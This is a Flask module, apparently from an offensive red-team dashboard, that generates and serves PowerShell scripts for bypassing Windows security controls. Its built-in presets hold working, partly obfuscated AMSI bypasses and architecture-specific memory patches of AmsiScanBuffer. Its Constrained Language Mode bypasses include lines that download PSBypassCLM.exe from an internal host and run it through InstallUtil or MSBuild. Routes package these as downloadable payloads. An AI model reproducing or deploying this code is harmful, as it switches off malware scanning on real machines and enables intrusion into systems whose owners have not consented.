from pathlib import Path

from flask import Blueprint, render_template, request, jsonify, abort, Response
from meuk.flask.models import db_amsi_preset
from meuk.flask.security import require_dashboard_access, is_local_request
from app import db

_PAYLOAD_PATH = Path('http/payloads/amsi-bypass.ps1')

amsi_bp = Blueprint('amsi_bp', __name__, template_folder='html')

# ---------------------------------------------------------------------------
# Standaard presets — worden eenmalig in de DB gezaaid vanuit app.py
# ---------------------------------------------------------------------------

DEFAULT_PRESETS = [
    {
        'naam': 'AmsiInitFailed (reflection)',
        'categorie': 'amsi',
        'architectuur': 'any',
        'methode': 'reflection',
        'omschrijving': 'Zet amsiInitFailed via reflection — arch-onafhankelijk, raakt geen native bytes',
        'code': "$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$r.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 1,
    },
    {
        'naam': 'Memory patch x64',
        'categorie': 'amsi',
        'architectuur': 'x64',
        'methode': 'patch',
        'omschrijving': 'Patcht AmsiScanBuffer met xor eax,eax + ret (6 bytes) — fastcall ABI',
        'code': """$Win32=@" using System;using System.Runtime.InteropServices; public class Win32x64{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32x64;$l=[Win32x64]::LoadLibrary("amsi.dll");$a=[Win32x64]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32x64]::VirtualProtect($a,[uint32]6,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC3,0x90,0x90,0x90),0,$a,6)""",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 2,
    },
    {
        'naam': 'Memory patch x86',
        'categorie': 'amsi',
        'architectuur': 'x86',
        'methode': 'patch',
        'omschrijving': 'Patcht AmsiScanBuffer met xor eax,eax + ret 24 (5 bytes) — stdcall ABI',
        'code': """$Win32=@" using System;using System.Runtime.InteropServices; public class Win32x86{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32x86;$l=[Win32x86]::LoadLibrary("amsi.dll");$a=[Win32x86]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32x86]::VirtualProtect($a,[uint32]5,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC2,0x18,0x00),0,$a,5)""",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 3,
    },
    {
        'naam': 'Memory patch ARM64',
        'categorie': 'amsi',
        'architectuur': 'arm64',
        'methode': 'patch',
        'omschrijving': 'Patcht AmsiScanBuffer met movz w0,#0 + ret (8 bytes) — ARM64 little-endian',
        'code': """$Win32=@" using System;using System.Runtime.InteropServices; public class Win32Arm64{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32Arm64;$l=[Win32Arm64]::LoadLibrary("amsi.dll");$a=[Win32Arm64]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32Arm64]::VirtualProtect($a,[uint32]8,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x00,0x00,0x80,0x52,0xC0,0x03,0x5F,0xD6),0,$a,8)""",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 4,
    },
    {
        'naam': 'AmsiContext null pointer',
        'categorie': 'amsi',
        'architectuur': 'any',
        'methode': 'context',
        'omschrijving': 'Zet AmsiContext naar null via reflection — betrouwbaar pre-Win11',
        'code': "$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like \"*Context\"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 5,
    },
    {
        'naam': 'CLM: Custom runspace',
        'categorie': 'clm',
        'architectuur': 'any',
        'methode': 'runspace',
        'omschrijving': 'Maakt eigen runspace buiten CLM-policy — arch-onafhankelijk, puur managed',
        'code': 'powershell -c "$rs=[runspacefactory]::CreateRunspace();$rs.ApartmentState=\'STA\';$rs.ThreadOptions=\'ReuseThread\';$rs.Open();$p=$rs.CreatePipeline();$p.Commands.AddScript(\'whoami\');$p.Invoke()"',
        'actief': True,
        'ingebouwd': True,
        'volgorde': 10,
    },
    {
        'naam': 'CLM: InstallUtil x64',
        'categorie': 'clm',
        'architectuur': 'x64',
        'methode': 'installutil',
        'omschrijving': 'PSBypassCLM via InstallUtil 64-bit — vereist PSBypassCLM.exe',
        'code': "iwr -Uri 'http://10.0.0.1/tools/PSBypassCLM.exe' -OutFile 'c:\\windows\\tasks\\PSBypassCLM.exe' -TimeoutSec 300\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\PSBypassCLM.exe",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 11,
    },
    {
        'naam': 'CLM: InstallUtil x86',
        'categorie': 'clm',
        'architectuur': 'x86',
        'methode': 'installutil',
        'omschrijving': 'PSBypassCLM via InstallUtil 32-bit — vereist PSBypassCLM_x86.exe',
        'code': "iwr -Uri 'http://10.0.0.1/tools/PSBypassCLM_x86.exe' -OutFile 'c:\\windows\\tasks\\PSBypassCLM_x86.exe' -TimeoutSec 300\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\PSBypassCLM_x86.exe",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 12,
    },
    {
        'naam': 'CLM: MSBuild x64',
        'categorie': 'clm',
        'architectuur': 'x64',
        'methode': 'msbuild',
        'omschrijving': 'MSBuild inline C# task voor CLM bypass — vereist clm_bypass.xml',
        'code': "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\tasks\\clm_bypass.xml",
        'actief': True,
        'ingebouwd': True,
        'volgorde': 13,
    },
    {
        'naam': 'CLM: PowerShell v2',
        'categorie': 'clm',
        'architectuur': 'any',
        'methode': 'psv2',
        'omschrijving': 'Start PS v2 — geen CLM, geen AMSI. Vereist .NET 2.0/3.5 feature',
        'code': 'powershell -version 2 -ep bypass',
        'actief': True,
        'ingebouwd': True,
        'volgorde': 14,
    },
]


# ---------------------------------------------------------------------------
# Hulpfuncties voor codegeneratie
# ---------------------------------------------------------------------------

def _pick_preset(categorie, methode, architectuur):
    """Haal het meest relevante actieve preset op — exact match, dan 'any' fallback."""
    p = db_amsi_preset.query.filter_by(
        categorie=categorie, methode=methode, architectuur=architectuur, actief=True
    ).order_by(db_amsi_preset.volgorde).first()
    if p:
        return p
    if architectuur != 'any':
        p = db_amsi_preset.query.filter_by(
            categorie=categorie, methode=methode, architectuur='any', actief=True
        ).order_by(db_amsi_preset.volgorde).first()
    return p


def _indent(code, spaces=8):
    prefix = ' ' * spaces
    return '\n'.join(prefix + line for line in code.splitlines())


def _generate(arch, amsi_method, clm_method=None):
    """Genereer een PowerShell bypass-script op basis van architectuur en methode."""
    lines = ['# AMSI Bypass — gegenereerd door Incompetent Bastard']

    if arch == 'auto':
        fallback = _pick_preset('amsi', 'reflection', 'any')
        arch_map = [('x64', 'X64'), ('x86', 'X86'), ('arm64', 'Arm64')]

        lines.append('$arch=[System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture')
        lines.append('switch("$arch"){')

        for a, label in arch_map:
            p = _pick_preset('amsi', amsi_method, a)
            if not p:
                p = _pick_preset('amsi', amsi_method, 'any')
            if not p:
                p = fallback
            if p:
                lines.append(f"    '{label}' {{")
                lines.append(_indent(p.code, 8))
                lines.append('    }')

        if fallback:
            lines.append('    default {')
            lines.append(_indent(fallback.code, 8))
            lines.append('    }')

        lines.append('}')
    else:
        preset = _pick_preset('amsi', amsi_method, arch)
        if not preset:
            preset = _pick_preset('amsi', 'reflection', 'any')
        if preset:
            lines.append(f'# {preset.naam}')
            if preset.omschrijving:
                lines.append(f'# {preset.omschrijving}')
            lines.append(preset.code)

    if clm_method and clm_method != 'none':
        clm_arch = arch if arch != 'auto' else 'any'
        clm_preset = _pick_preset('clm', clm_method, clm_arch)
        if not clm_preset:
            clm_preset = _pick_preset('clm', clm_method, 'any')
        if clm_preset:
            lines.append('')
            lines.append(f'# CLM Bypass: {clm_preset.naam}')
            if clm_preset.omschrijving:
                lines.append(f'# {clm_preset.omschrijving}')
            lines.append(clm_preset.code)

    return '\n'.join(lines)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@amsi_bp.route('/dashboard/amsi')
def amsi_generator():
    require_dashboard_access()
    return render_template('amsi_generator.html')


@amsi_bp.route('/api/amsi/presets', methods=['GET'])
def api_presets_list():
    require_dashboard_access()
    presets = db_amsi_preset.query.order_by(db_amsi_preset.volgorde, db_amsi_preset.id).all()
    return jsonify([_preset_dict(p) for p in presets])


@amsi_bp.route('/api/amsi/presets/<int:preset_id>', methods=['GET'])
def api_preset_get(preset_id):
    require_dashboard_access()
    p = db_amsi_preset.query.get_or_404(preset_id)
    return jsonify(_preset_dict(p))


@amsi_bp.route('/api/amsi/presets', methods=['POST'])
def api_preset_create():
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True)
    naam = str(data.get('naam', '')).strip()[:100]
    if not naam:
        return jsonify({'error': 'naam verplicht'}), 400

    categorie = data.get('categorie', 'amsi')
    if categorie not in ('amsi', 'clm'):
        categorie = 'amsi'
    architectuur = data.get('architectuur', 'any')
    if architectuur not in ('any', 'x64', 'x86', 'arm64'):
        architectuur = 'any'

    p = db_amsi_preset(
        naam=naam,
        categorie=categorie,
        architectuur=architectuur,
        methode=str(data.get('methode', '')).strip()[:30],
        omschrijving=str(data.get('omschrijving', '')).strip()[:300],
        code=str(data.get('code', '')),
        actief=bool(data.get('actief', True)),
        ingebouwd=False,
        volgorde=int(data.get('volgorde', 99)),
    )
    db.session.add(p)
    db.session.commit()
    return jsonify({'ok': True, 'id': p.id}), 201


@amsi_bp.route('/api/amsi/presets/<int:preset_id>', methods=['PUT'])
def api_preset_update(preset_id):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    p = db_amsi_preset.query.get_or_404(preset_id)
    data = request.get_json(force=True)

    if 'naam' in data:
        p.naam = str(data['naam']).strip()[:100]
    if 'categorie' in data and data['categorie'] in ('amsi', 'clm'):
        p.categorie = data['categorie']
    if 'architectuur' in data and data['architectuur'] in ('any', 'x64', 'x86', 'arm64'):
        p.architectuur = data['architectuur']
    if 'methode' in data:
        p.methode = str(data['methode']).strip()[:30]
    if 'omschrijving' in data:
        p.omschrijving = str(data['omschrijving']).strip()[:300]
    if 'code' in data:
        p.code = str(data['code'])
    if 'actief' in data:
        p.actief = bool(data['actief'])
    if 'volgorde' in data:
        p.volgorde = int(data['volgorde'])

    db.session.commit()
    return jsonify({'ok': True})


@amsi_bp.route('/api/amsi/presets/<int:preset_id>', methods=['DELETE'])
def api_preset_delete(preset_id):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    p = db_amsi_preset.query.get_or_404(preset_id)
    if p.ingebouwd:
        return jsonify({'error': 'Ingebouwde presets kunnen niet worden verwijderd'}), 400
    db.session.delete(p)
    db.session.commit()
    return jsonify({'ok': True})


@amsi_bp.route('/api/amsi/generate', methods=['GET'])
def api_generate():
    require_dashboard_access()
    arch = request.args.get('arch', 'auto')
    if arch not in ('auto', 'x64', 'x86', 'arm64'):
        arch = 'auto'
    amsi_method = request.args.get('method', 'reflection')
    clm_method = request.args.get('clm') or None
    code = _generate(arch, amsi_method, clm_method)
    return jsonify({'code': code})


@amsi_bp.route('/api/amsi/save-payload', methods=['POST'])
def api_save_payload():
    """Schrijf de (vervangen) bypass rechtstreeks naar http/payloads/amsi-bypass.ps1."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True)
    code = str(data.get('code', ''))
    if not code.strip():
        return jsonify({'error': 'Geen code opgegeven'}), 400
    try:
        _PAYLOAD_PATH.parent.mkdir(parents=True, exist_ok=True)
        _PAYLOAD_PATH.write_text(code, encoding='utf-8')
    except OSError as e:
        return jsonify({'error': str(e)}), 500
    return jsonify({'ok': True, 'path': str(_PAYLOAD_PATH)})


@amsi_bp.route('/dashboard/amsi/payload.ps1', methods=['GET'])
def amsi_payload_download():
    require_dashboard_access()
    arch = request.args.get('arch', 'auto')
    if arch not in ('auto', 'x64', 'x86', 'arm64'):
        arch = 'auto'
    amsi_method = request.args.get('method', 'reflection')
    clm_method = request.args.get('clm') or None
    code = _generate(arch, amsi_method, clm_method)
    return Response(
        code,
        mimetype='text/plain',
        headers={'Content-Disposition': 'attachment; filename=amsi-bypass.ps1'},
    )


# ---------------------------------------------------------------------------
# Hulp
# ---------------------------------------------------------------------------

def _preset_dict(p):
    return {
        'id': p.id,
        'naam': p.naam,
        'categorie': p.categorie,
        'architectuur': p.architectuur,
        'methode': p.methode,
        'omschrijving': p.omschrijving,
        'code': p.code,
        'actief': p.actief,
        'ingebouwd': p.ingebouwd,
        'volgorde': p.volgorde,
    }
